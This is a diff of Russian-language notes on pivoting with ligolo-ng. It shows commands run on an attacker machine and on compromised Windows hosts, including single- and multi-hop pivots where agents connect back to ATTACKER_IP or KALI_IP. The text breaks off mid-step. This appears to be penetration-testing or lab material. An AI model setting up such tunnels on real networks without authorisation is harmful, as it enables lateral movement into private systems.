@@ -28,22 +28,36 @@
    Ligolo работает на уровне IP, а не на уровне прокси.
    Это почти VPN.
 
-## Использование
+# Использование
 
-1. На атакующей машине:
-Запускаем relay:
+## Простой Pivot (1 промежуточный хост)
+
+1) На атакующей запускаем 
 ```bash
-ligolo-ng relay
+ligolo-ng proxy --selfcert
 ```
-Создаётся TLS listener.
 
-2. На compromised host:
+2) На Pivot хосте запускаем
 ```bash
-ligolo-ng agent -connect ATTACKER_IP:11601 -ignore-cert
+agent.exe -connect ATTACKER_IP:11601 -ignore-cert
 ```
-Агент подключается к relay.
 
-3. На атакующей машине:
+
+## Многоступенчатый Pivot
+
+1. Повторяем шаги из простого Pivot
+
+2. далее на 1 Pivot хосте (где запущен агент) включаем релей
+```bash
+ligolo-ng relay -connect <KALI_IP>:11601 -ignore-cert
+```
+
+3. На следующем Pivot хосте (Windows 2)  запускаем уже там агента
+```bash
+agent.exe -connect <IP_WINDOWS_1>:11601 -ignore-cert
+```
+
+4. На атакующей машине:
 В консоли relay:
 ```
 session  
